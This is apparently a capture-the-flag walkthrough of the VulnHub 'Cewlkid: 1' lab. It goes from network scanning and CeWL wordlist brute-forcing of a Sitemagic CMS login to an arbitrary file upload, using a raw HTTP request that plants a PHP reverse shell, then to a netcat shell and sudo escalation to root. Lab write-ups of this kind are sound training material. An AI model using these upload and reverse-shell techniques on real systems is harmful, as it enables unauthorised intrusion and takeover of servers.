# Cewlkid: 1 Vulnhub Walkthrough

Today, we are going to solve another boot2root challenge called “**Cewlkid: 1**“. It is available at VulnHub for penetration testing practices and you can download it from **here**. The commendation of making this lab goes to **@iamv1nc3nt**. Let’s start and learn how to boot it successfully.

### Penetration Testing Methodology

**Reconnaissance**

- Netdiscover
- Nmap

**Enumeration**

- Cewl
- Brute force login Sitemagic CMS with Burp
- Pyps64

**Exploiting**

- Sitemagic Arbitrary File Upload

**Privilege Escalation**

- Abuse crontab with plain passwords
- Abuse of sudo
- Capture the flag

## Walkthrough

### Reconnaissance

We are looking for the IP address of the target machine with netdiscover:

netdiscover -i ethX

Currently scanning: 192.168.37.0/16 | Screen View: Unique Hosts
37 Captured ARP Req/Rep packets, from 9 hosts. Total size: 2224
---------------------------------------------------------------------------------
IP              At MAC Address      Count       Len     MAC Vendor / Hostname
---------------------------------------------------------------------------------
192.168.10.1    --:--:--:--:--:-4      21      1260     Sagemcom Broadband SAS
192.168.10.164  --:--:--:--:--:-d       9       540     SAMSUNG ELECTRO MECHANICS
192.168.10.154  --:--:--:--:--:-2       1        60     Sagemcom Broadband SAS
192.168.10.155  --:--:--:--:--:-d       1        60     Intel Corporate
192.168.10.159  --:--:--:--:--:-5       1        64     Sagemcom Broadband SAS
192.168.10.166  --:--:--:--:--:-0       1        60     Amazon Technologies Inc.
192.168.10.183  --:--:--:--:--:-6       1        60     PCS Systemtechnik GmbH
192.168.10.156  --:--:--:--:--:-2       1        60     Amazon Technologies Inc.
192.168.10.158  --:--:--:--:--:-8       1        60     Unknown vendor

Once we have the IP address, the next step is to perform a network scan and so we will use nmap for it as shown in the following image:

nmap -A –p- 192.168.10.183

root@m3n0sd0n4ld:~/CewlKid# nmap -A –p- 192.168.10.183 -o 192.168.10.183
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 03:07 EDT
Nmap scan report for 192.168.10.183
Host is up (0.0012s latency).
Not shown: 65532 closed ports
PORT     STATE   SERVICE VERSION
22/tcp   open    ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; pro
80/tcp   open    http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open    http    nginx 1.18.0 (Ubuntu)
|_http-generator: Sitemagic CMS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome - about us

### Enumeration

We ignore the port 80 web service as it is useless to the aforementioned Boot2Root challenge and hop to list a **Sitemagic CMS** on port **8080**.

---------------------------------------------------------------------------------
192.168.10.183:8080

Sitemagic CMS
Create beautiful and
captivating websites with
Sitemagic CMS, and spend
your valuable time building
your business and your
brand.
Sitemagic CMS features
unique and user friendly
features such as the
Designer that makes it
easier than ever to
customize the look and feel
of your website.
If you need help or want to
contribute, please **join us
on Facebook**.
---------------------------------------------------------------------------------

Then, we review the content and sections, we will find the link to the administration panel of the web application.

---------------------------------------------------------------------------------
192.168.10.183:8080/index.php?SMExt=SMLogin

Sitemagic CMS
LOG IN
Username
Password
Language en

Log In

Sitemagic CMS - Open Source Content Management System
---------------------------------------------------------------------------------

With all this information and given that the machine is called “**Cewlkid**“, it is very clear that we will need to create a dictionary with the tool “**Cewl**” using the different sections of the web to obtain the possible password.

root@m3n0sd0n4ld:~/CewlKid# cewl "http://192.168.10.183:8080" > cewl-dic3.txt
root@m3n0sd0n4ld:~/CewlKid# wc -l cewl-dic3.txt
201 cewl-dic3.txt
root@m3n0sd0n4ld:~/CewlKid#

With the help of **Burp suite** and using the dictionary we just created, we will perform brute force on the user “**admin**” **(official information default user**).

----------------------------------------------------------------------------------------------------
Request     Payload                             Status      Error   Timeout     Length      Comment
----------------------------------------------------------------------------------------------------
184         Letraset                            302                             321
1           CeWL 5.4.8 (Inclusion) Robin W...   200                             10099
2           Follow                              200                             10099
3           compliance                          200                             10099
4           Sunrise                             200                             10099
5           Sitemagic                           200                             10099
6           CMS                                 200                             10099
7           ScreenShots                         200                             10099
8           jpeg                                200                             10099
----------------------------------------------------------------------------------------------------
Request | Response
----------------------------------------------------------------------------------------------------
Raw | Headers | Hex
----------------------------------------------------------------------------------------------------
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 19 Sep 2020 07:23:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php?SMExt=SMAnnouncements
Content-Length: 0
----------------------------------------------------------------------------------------------------

Then, we access the control panel and verify that the credentials are valid.

---------------------------------------------------------------------------------
192.168.10.183:8080/index.php?SMExt=SMAnnouncements

Sitemagic CMS
Announcements

Welcome to Sitemagic CMS -- Pages
Thank you for using Sitemagic CMS! Admin
Software status: Sitemagic CMS is up to date and ready tp

User guide
The gives you an introduction to the various fu,
Sitemagic CMS. Learn how to change settings, modify the
content, handle files, and much more.

Developer's guide
Sitemagic CMS is the easiest CMS on the planet to customize
---------------------------------------------------------------------------------

### Exploiting

Inside we can list the exact version of the application and check that there is an exploit to **upload arbitrary files**.

**Exploit**: **https://www.exploit-db.com/exploits/48788**

As always, we will do a **proof of concept** to verify that the site is vulnerable. And for that, we have captured the following request.

**Request:**

----------------------------------------------------------------------------------------------------
Request
Raw | Params | Headers | Hex
----------------------------------------------------------------------------------------------------
GET
/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPa
th=files%2Fimages HTTP/1.1
Host: 192.168.10.183:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv: 68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data;
boundary=---------------------------144837887339078243581158835832
Content-Length: 537
Referer:
http://192.168.10.183:8080/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMF
ilesUpload&SMFilesUploadPath=files%2Fimages
Connection: close
Cookie: SMSESSI0N6b631023323ea9ab=d9m0gq2qe8nqcja5qhrtkgcko3;
SM#/#smFieldsetVisibleSMConfigDatabase=true: SM#/#smFieldsetVisibleSMConfigSmtp=true:
SM#/#smFieldsetVisibleSMConfigSubsites=false
Upgrade-Insecure-Requests: 1
Origin: 192.168.10.183:8080
DNT: 1

---------------------------144837887339078243581158835832
Content-Disposition: form-data; name="SMInputSMFilesUpload"; filename="info.php"
Content-Type: application/x-php

<?php phpinfo(); ?>

---------------------------144837887339078243581158835832
Content-Disposition: form-data; name="SMPostBackControl"

---------------------------144837887339078243581158835832
Content-Disposition: form-data; name="SMRequestToken"

f9fl16f33c012ce5e67f52dffc7e6bc6
---------------------------144837887339078243581158835832--
----------------------------------------------------------------------------------------------------

The response for the above request is the following:

----------------------------------------------------------------------------------------------------
Response
Raw | Headers | Hex | HTML | Render
----------------------------------------------------------------------------------------------------
HTTP/1.1 200 0K
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 19 Sep 2020 07:41:00 GMT
Content-Type: text/html; charset=windows-1252
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2462
----------------------------------------------------------------------------------------------------

Perfect! We upload the file and see that we have indeed been able to upload the “**info.php**” file.

----------------------------------------------------------------------------------------------------------------
192.168.10.183:8080/files/images/info.php

PHP Version 7.4.3

System                                      Linux cewlkid 5.4.0-47-generic #51-Ubuntu SMP Fri Sep 4 19:50:5
Build Date                                  May 26 2020 12:24:22
Server API                                  FPM/FastCGI
Virtual Directory Support                   disabled
Configuration File (php.ini) Path           /etc/php/7.4/fpm
Loaded Configuration File                   /etc/php/7.4/fpm/php.ini
Scan this dir for additional .ini files     /etc/php/7.4/fpm/conf.d
Additional .ini files parsed                Jetc/php/7.4/fpm/conf.d/10-opcache. ini, /etc/php/7.4/fpm/conf.d/1
                                            /15-xml.ini, fetc/php/7.4/fpm/cont.d/20-calendar.ini, /etc/php/7.4/f
                                            /7.4/fpm/conf.d/20-dom.ini, /etc/php/7.4/fpm/conf.d/20-exit.ini, fete
                                            /etc/php/7.4/fpm/conf.d/20-fileinfo.ini, /etc/php/7.4/fpm/conf.d/20-1
                                            /20-gettext ini, fetc/php/7.4/fpm/conf.d/20-iconv.ini, /etc/php/7.4/f
                                            /7.4/fpm/conf.d/20-mbstring .ini, fetc/php/7.4/fpm/conf.d/20-phar.ir
                                            posix. ni, /etc/php/7.4/fpm/conf.d/20-readline. ini, /etc/php/7.4/fpm,
                                            /7.4/fpm/conf.d/20-simplexml.ini, /etc/php/7.4/fpm/conf.d/20-socke
                                            sysvmsg_.ini, Jetc/php/7.4/fpm/conf.d/20-sysvsem ini, /etc/php/7.4/
                                            /etc/php/7.4/fpm/conf.d/20-tokenizer.ini, /etc/php/7.4/fpm/cont.d/2
                                            /conf.d/20-xmlwriter.ini, /etc/php/7.4/fpm/conf.d/20-xsl.ini
----------------------------------------------------------------------------------------------------------------

We repeat the same steps, but this time we will upload a web shell. (I used **pentestmonkey’s**)

---------------------------------------------------------------------------------
---------------------------144837887339078243581158835832
Content-Disposition: form-data; name="SMInputSMFilesUpload"; filename="shell.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. The author accepts no liability
// for damage caused by this tool. If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
---------------------------------------------------------------------------------

We put a netcat on the wire and load our "**shell.php**" file. We will get access to the inside of the machine

root@m3n0sd0n4ld:~/CewlKid# rlwrap nc -nvlp 4444
Listening on [any] 4444 ...
connect to [192.168.10.180] from (UNKNOWN) [192.168.10.183] 37610
Linux cewlkid 5.4.0-47-generic #51-Ubuntu SMP Fri Sep 4 19:50:52 UTC 2020 x86_64 x86_
64 x86_64 GNU/Linux
 08:24:29 up 1:19,  0 users,    load average: 0.06, 0.02, 0.00
USER    TTY     FROM        LOGIN@      IDLE    JCPU    PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@cewlkid:/$ export TERM=xterm-256color
export TERM=xterm-256color
www-data@cewlkid:/$ 

### Privilege Escalation (Cewlbeans)

There are several users in the system, but using the tool "**pspy64**" we enumerate that a remote connection is executed from time to time with the user "**cewlbeans**" where the password appears in plain text.

2020/09/19 14:47:01 CMD: UID=0      PID=64303   | /bin/bash /root/pth-toolkit-master/scr
ipt.sh
2020/09/19 14:47:01 CMD: UID=0      PID=64304   | /bin/sh /root/pth-toolkit-master/pth-w
inexe -U cewlbeans%fondateurs //kali whoami
2028/09/19 14:47:02 CMD: UID=0      PID=64305   | /root/pth-toolkit-master/bin/winexe -U
 cewlbeans%fondateurs //kali whoami

### Privilege Escalation (root)

We authenticate with the user "**cewlbeans**", execute the command "**sudo -l**" and we find the pleasant surprise that we can execute any binary as any user.

www-data@cewlkid:/$ su cewlbeans
su cewlbeans
Password: fondateurs

cewlbeans@cewlkid:/$ id
id
uid=1004(cewlbeans) gid=1004(cewlbeans) groups=1004(cewlbeans)
cewlbeans@cewlkid:/$ sudo -l
sudo -l
[sudo] password for cewlbeans: fondateurs

Matching Defaults entries for cewlbeans on cewlkid:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/us
nap/bin

User cewlbeans may run the following commands on cewlkid:
    (ALL : ALL) ALL
cewlbeans@cewlkid:/$ 

Let’s not waste time, we execute a **/bin/sh** as "**root**" and read the flag.

cewlbeans@cewlkid:/$ sudo -u root /bin/sh
sudo -u root /bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cat /root/root.txt
CEWLKID ROOT
RmxhZwo=
